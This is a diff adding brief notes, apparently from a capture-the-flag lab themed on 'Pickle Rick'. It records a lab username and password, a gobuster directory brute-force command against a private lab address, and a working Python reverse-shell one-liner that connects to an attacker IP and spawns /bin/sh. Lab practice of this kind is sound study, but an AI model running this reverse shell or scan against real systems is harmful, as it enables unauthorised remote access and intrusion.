@@ -1,0 +1,9 @@
+Pickle
+User Name R1ckRul3s
+robots --> http://10.10.162.228/
+
+Wubbalubbadubdub
+
+gobuster dir -u 10.10.162.228 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.39.83",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
